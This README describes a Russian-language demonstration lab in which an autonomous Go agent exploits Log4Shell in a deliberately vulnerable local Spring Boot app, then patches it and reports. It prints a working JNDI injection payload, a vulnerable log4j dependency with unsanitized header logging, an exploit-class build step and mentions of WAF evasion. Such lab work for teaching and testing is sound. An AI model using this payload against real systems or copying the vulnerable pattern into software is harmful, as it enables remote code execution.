# 🤖 AEON ARSENAL: Autonomous Reactive Pentest Agent

*Read this in other languages: [English](README.en.md), [Русский](README.md).*

> **Isolated demonstration lab of an autonomous reactive executor agent (Go/Java)**

[](https://golang.org)
[](https://openjdk.org)
[](https://maven.apache.org)
[](LICENSE)

---

## 🧭 Overview

**AEON ARSENAL** is a software system demonstrating a **100% autonomous closed-loop (Sense-Think-Act)** cycle of vulnerability discovery, validation, exploitation, auto-remediation (self-healing), and compliance reporting for the critical **Log4Shell** vulnerability (**CVE-2021-44228**).

The sandbox spawns a local target web application built on **Java Spring Boot**, an embedded **LDAP TCP Callback Listener**, and a cognitive **Go agent** kernel, which coordinates actions in a partially observable environment (*Partially Observable Markov Decision Process — POMDP*).

```mermaid
graph TD
    subgraph "SENSORY ANALYSIS (Sense)"
        A[External responses / TCP callbacks] --> B(Update Knowledge Base)
    end
    subgraph "COGNITIVE CORE (Think)"
        B --> C{Calculate Utility Policy}
        C -->|Reflexive Inference| D[Select Effector from Registry]
    end
    subgraph "EXECUTION (Act)"
        D --> E[Execute Tool.Execute]
        E -->|Impact| F((Java Spring Boot Target))
        F -.->|Out-of-Band OOB Channel| A
    end
    
    style B fill:#111,stroke:#00ADD8,stroke-width:2px;
    style C fill:#111,stroke:#ED8B00,stroke-width:2px;
    style F fill:#222,stroke:#C71A36,stroke-width:3px;
```



---

## 🛠️ Technical Architecture & Components

The agent's software structure is developed following Hexagonal Architecture (Ports and Adapters), SOLID, and TDD principles:

* **[cmd/agent/main.go](cmd/agent/main.go)** — Entrypoint. Manages background service lifecycles and coordinates the main agent loop.
* **[internal/agent/agent.go](internal/agent/agent.go)** — Cognitive engine. Implements the decision-making policy and agent loop.
* **[internal/core/model.go](internal/core/model.go)** — Thread-safe `KnowledgeBase` (LTM) based on a `sync.RWMutex`.
* **[internal/core/effector.go](internal/core/effector.go)** — `Tool` interface for effectors.
* **[internal/effectors/](internal/effectors/)** — Polymorphic effectors (tools) registry:
  * `ToolPortScanner` — Reconnaissance and network port scanning.
  * `ToolDiscovery` — Web app parameter mapping and input vectors parsing (`X-Api-Version`).
  * `ToolPayloadGenerator` — Synthesizes JNDI signature vectors.
  * `ToolProber` — Out-of-Band (OOB) vulnerability verification.
  * `ToolSemanticFuzzer` — Obfuscation mutations (WAF Evasion) via nested lookups.
  * `ToolRemediator` — Automated hot patching.
  * `ToolReporter` — Security audit report generation.
* **[pkg/oob/](pkg/oob/)** — Out-of-band LDAP and HTTP servers.
* **[pkg/target/](pkg/target/)** — Manages compiled local Java simulation target process.
* **[deployments/](deployments/)** — Contains Docker and Compose configuration files.
* **[test/vulnerable-app/](test/vulnerable-app/)** — Target vulnerable Java Spring Boot microservice.

---

## 🎯 Cognitive Loop Specification (Think-Act Loop)

The agent decision-making model maps environment states $S$ to a discrete action space $A$. For each effector action, the posterior utility score is computed:

$$EfficiencyScore = \frac{SuccessCount}{UsageCount}$$

### Detailed Step-by-Step Scenario:

| Step | Selected Tool | Action & Underlying Process | Belief State Changes |
| :--- | :--- | :--- | :--- |
| **1** | `port_scanner` | Probe TCP socket at target port `:8080`. | HTTP port discovered. |
| **2** | `discovery` | Analyze headers and page structure. | Parameter `X-Api-Version` identified as an entry point. |
| **3** | `payload_generator` | Construct raw JNDI exploit signature. | Payloads updated with `\${jndi:ldap://127.0.0.1:1389/Exploit\}`. |
| **4** | `prober` | Exploitation. Agent sends payload. | LDAP server captures incoming TCP redirect. RCE confirmed. |
| **5** | `remediator` | Auto-Remediation. Hot patch target application config. | JVM properties re-initialized with `-Dlog4j2.formatMsgNoLookups=true`. |
| **6** | `prober` | Verification (re-testing). | LDAP server monitors callback port. Connection absent $\rightarrow$ `PatchVerified = true`. |
| **7** | `reporter` | Write compliance report. | Audit report generated at `reports/cve_2021_44228_report.md`. |
| **8** | `stop` | Termination. | Finished. |

---

## 📦 Vulnerable Java Application Specification

The target app under `test/vulnerable-app/` is a REST controller powered by **Spring Boot 2.7.18** with legacy **Apache Log4j2** dependency:

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version> <!-- Vulnerable version supporting JNDI lookup -->
</dependency>
```

The vulnerable endpoint logs HTTP headers without sanitization:
```java
logger.info("[AUDIT] API Version header logged: {}", apiVersion);
```

When receiving `${jndi:ldap://...}`, log4j core initiates LDAP resolution to the listener port `1389`.

---

## 🚀 Setup & Launch

### Prerequisites
* **JDK 17+** (verify via `java -version`)
* **Maven 3.8+** (verify via `mvn -version`)
* **Go 1.21+** (verify via `go version`)

### 1. Build Java Target Microservice
Compile target Java app to a executable fat JAR:
```bash
cd test/vulnerable-app
mvn clean package
cd ../..
```
*Verify that `test/vulnerable-app/target/vulnerable-app-simple-1.0.0.jar` was created.*

### 2. Build Exploit Payload
Compile the Java class served by the HTTP webserver:
```bash
javac internal/payload/Exploit.java
```

### 3. Build & Run Autonomous Sandbox
Run Go main loop using interpretation on-the-fly:
```bash
go run ./cmd/agent
```

Or compile to a standalone executable binary:
```bash
go build -o test_agent ./cmd/agent
./test_agent
```

---

## 📊 Sample Console Output

```text
=== ДЕМОНСТРАЦИОННЫЙ СТЕНД РЕАКТИВНОГО АГЕНТА (JAVA SPRING TARGET) ===
[*] Запуск LDAP TCP-слушателя на порту :1389 для фиксации OOB Log4Shell вызовов...
[*] Запуск скомпилированного уязвимого Java Spring приложения...
[*] Ожидание инициализации веб-контекста Spring (3.5 сек)...
[*] Инициализация агента-исполнителя для цели: http://localhost:8080
================================================================
[ВЫВОД] Выбран инструмент: 'port_scanner' (Текущая фаза: Reconnaissance)
[ЭФФЕКТОР:port_scanner] Сканирование порта localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружен открытый HTTP-порт localhost:8080. Java Spring Web-служба отвечает.

[ВЫВОД] Выбран инструмент: 'discovery' (Текущая фаза: Discovery)
[ЭФФЕКТОР:discovery] Исследование структуры веб-приложения http://localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружены потенциальные векторы ввода: GET-параметр '/?input=' и HTTP-заголовок 'X-Api-Version'.

[ВЫВОД] Выбран инструмент: 'payload_generator' (Текущая фаза: Discovery)
[ЭФФЕКТОР:payload_generator] Анализ уязвимостей и синтез сигнатур...
[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирована сигнатурная нагрузка для CVE-2021-44228: '${jndi:ldap://127.0.0.1:1389/Exploit}'.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Discovery)
[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${jndi:ldap://127.0.0.1:1389/Exploit}' на http://localhost:8080...

[СЛУШАТЕЛЬ] >>> ПОЛУЧЕН ВХОДЯЩИЙ TCP-КОЛЛБЕК НА ПОРТ 1389 (Log4Shell подтвержден!) <<<
[НАБЛЮДЕНИЕ] SUCCESS: LDAP Callback получен на порту 1389 (Loot: FLAG{LOG4SHELL_EXPLOITED_SUCCESSFULLY}).

[ВЫВОД] Выбран инструмент: 'remediator' (Текущая фаза: Remediation)
[ЭФФЕКТОР:remediator] Анализ причин уязвимости и генерация исправления для http://localhost:8080...
[ЭФФЕКТОР:remediator] Перезапуск Java-приложения с флагом -Dlog4j2.formatMsgNoLookups=true...
[НАБЛЮДЕНИЕ] REMEDIATION_SUCCESS: Патч применен. Изменен параметр запуска JVM на '-Dlog4j2.formatMsgNoLookups=true'. Процесс успешно перезапущен.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Verification)
[ЭФФЕКТОР:prober] Верификация патча: Повторная атака уязвимости на http://localhost:8080...
[НАБЛЮДЕНИЕ] VERIFICATION_SUCCESS: Попытка эксплуатации отклонена сервером. Входящий TCP-коллбек на порт 1389 отсутствует. Уязвимость успешно устранена.

[ВЫВОД] Выбран инструмент: 'reporter' (Текущая фаза: Verification)
[ЭФФЕКТОР:reporter] Формирование отчета об уязвимости по стандартам РФ для http://localhost:8080...
[НАБЛЮДЕНИЕ] REPORT_SUCCESS: Отчет успешно сгенерирован и сохранен в файл 'reports/cve_2021_44228_report.md'.

================================================================
[INFO] Жизненный цикл аудита, патчинга и комплаенса завершен.
```

---

## 📜 Compliance & Security Policies
The compliance report generated at `reports/cve_2021_44228_report.md` conforms to key cybersecurity frameworks:
* **GOST R 56939-2016** — Information protection. Secure software development.
* **Federal Law No. 152-FZ** "On Personal Data" requirements.
* **Federal Law No. 187-FZ** "On the Security of the Critical Information Infrastructure of the Russian Federation".

---

## 🛡️ License
This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
